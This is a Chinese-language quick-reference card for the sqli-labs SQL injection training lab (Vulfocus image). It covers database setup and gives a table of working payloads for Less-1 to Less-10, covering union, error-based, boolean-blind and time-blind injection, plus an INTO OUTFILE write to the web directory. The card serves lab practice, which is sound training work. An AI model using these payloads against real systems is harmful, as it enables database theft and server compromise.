# Audi-1 sqli-labs 多关卡 SQL 注入靶场

> **定位：**题库只给出 `vulfocus/sqli-labs`，没有 CVE，也没有 Less 编号。sqli-labs 按关卡训练不同闭合方式和注入类型；因此不能替题目选定一条漏洞链。下表只整理直接题解覆盖的 Less-1 至 Less-10，先看目标实际关卡，再套对应步骤。[S1][S2][S3][S4]

- 题库端口：`80,3306`。Web 走映射到容器 `80` 的 HTTP；`3306` 是 MySQL，不是本题注入入口。[S1][S2]
- 直接题解：ZQQ《SQLi Labs》，覆盖 Page-1 的 Less-1 至 Less-10；该文的 Docker 端口/路径不等于本题已确认路径。[S4]

## 操作步骤

1. 打开 Vulfocus 映射到容器 `80` 的地址。项目首页有 **Setup/reset Database for labs**；未初始化时先点它，再进 Less。[S2][S3][S4]
2. 只有目标页面确实显示 Less 编号时，才按下表选择对应闭合方式和注入类型。题库没有指定关卡，若页面无法确认编号，**不要预先选某条 payload**。[S2][S3]
3. 以该关能查出 `security.users` 的用户名为成功信号（Less-1 题解回显 `Dumb`/`admin` 等）。编号超出 Less-1 至 Less-10 时，本卡片的题解未覆盖。[S4]

## Less-1 至 Less-10 快速步骤

| 关卡 | 对应操作 | 关键条件/排坑 |
|---|---|---|
| Less-1 | GET 单引号字符型。`?id=1'` 报错后，用 `?id=-1' union select 1,2,3 --+` 找回显列，再 `group_concat` 查 `users`。[S4] | `--` 后必须有空格；浏览器里用 `--+`。不要套数字型（Less-2）的无引号写法。 |
| Less-2 | GET 数字型。`?id=1'` 报错点在 `'' LIMIT` 之前无包裹引号；`?id=-1 union select 1,2,3 --+`。[S4] | 不要再闭合 `'`。 |
| Less-3 | GET 单引号 + 括号。报错含 `1'')`；`?id=-1') union select 1,2,3 --+`。[S4] | 只补 `')`，不要只补 `'`。 |
| Less-4 | GET 双引号 + 括号。`?id=1"` 才报错；`?id=-1") union select 1,2,3 --+`。[S4] | 单引号探测可能不报错，不能据此判无注入。 |
| Less-5 | GET 双查询报错（页面几乎无 union 回显）。用 `count(*)` + `concat(... ,floor(rand(0)*2)) ... group by` 从 `Duplicate entry` 带出数据。[S4] | 不要沿用 Less-1 的回显位判断；union 往往只有 “You are in”。 |
| Less-6 | 同 Less-5 的报错注入，闭合改成双引号：`?id=1"`。[S4] | 探测符是 `"` 不是 `'`。 |
| Less-7 | 闭合 `'))`，题解用 `union select ... into outfile '/var/www/html/...'` 写文件再访问。[S4] | 依赖 `FILE` 权限和 web 目录可写；题解还改过容器 `chmod`，远程不一定具备。 |
| Less-8 | 布尔盲注、单引号。页面只有 “You are in” 有无；用 `AND ASCII(SUBSTRING(...))=...` 逐字符。[S4] | 没有报错回显；不要改回 union。 |
| Less-9 | 时间盲注、单引号。`?id=1' and SLEEP(2) --+` 以延迟为准，再用 `IF(..., SLEEP(5), NULL)`。[S4] | 真假页看起来一样；只看响应时间。 |
| Less-10 | 时间盲注、双引号。`?id=1" and SLEEP(5) --+`。[S4] | 闭合是 `"`；其余同 Less-9。 |

## 来源

- **[S1] 题库镜像：**[Docker Hub — vulfocus/sqli-labs](https://hub.docker.com/r/vulfocus/sqli-labs) — 与题库镜像名对应；现有页面信息不足以确定镜像内具体 Less。
- **[S2] sqli-labs 项目说明：**[Audi-1/sqli-labs — readme.md](https://github.com/Audi-1/sqli-labs/blob/master/readme.md) — 按 Error/Blind/Header 等多类 GET/POST 关卡组织；安装后要点 setup/resetDB。支撑“先确定实际关卡”。
- **[S3] 项目首页：**[Audi-1/sqli-labs — index.html](https://github.com/Audi-1/sqli-labs/blob/master/index.html) — 列出 Setup/reset Database 与 Page-1 Basic Challenges 入口。
- **[S4] 直接关卡题解：**[ZQQ — SQLi Labs](https://zqq.name/docs/security/exploits/1-SQLi-Labs/) — 逐关记录 Less-1 至 Less-10 的闭合方式、union/报错/盲注/outfile 及 `--+`；支撑操作步骤和速查表。文中 `50080` 与 `acgpiano/sqli-labs` 不是本题镜像的已知信息。

来源清单：[`../sources/147_sqli-labs/_meta.md`](../sources/147_sqli-labs/_meta.md)
